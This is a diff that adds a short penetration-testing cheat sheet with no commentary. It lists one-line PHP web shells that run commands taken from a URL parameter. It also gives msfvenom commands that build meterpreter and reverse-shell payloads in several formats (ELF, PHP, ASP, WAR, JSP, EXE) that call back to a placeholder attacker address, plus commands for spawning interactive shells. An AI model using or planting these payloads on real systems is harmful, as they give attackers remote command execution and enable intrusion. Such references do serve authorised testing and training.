@@ -1,0 +1,30 @@
+PHP
+<?php system($_GET["cmd"]); ?>
+<?php echo shell_exec($_GET["cmd"]); ?>
+
+
+
+Msfvenom
+#Linux
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f elf > shell.elf
+# PHP
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f raw > shell.php
+# ASP
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f asp > shell.asp
+# WAR
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f war > shell.war
+# JSP
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f raw > shell.jsp
+# Exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=445 -f exe -o shell_reverse.exe
+
+
+Interactive TTY Shell
+# python
+python -c 'import pty; pty.spawn("/bin/sh")'
+# Echo
+echo 'os.system('/bin/bash')'
+# sh
+/bin/sh -i
+# bash
+/bin/bash -i
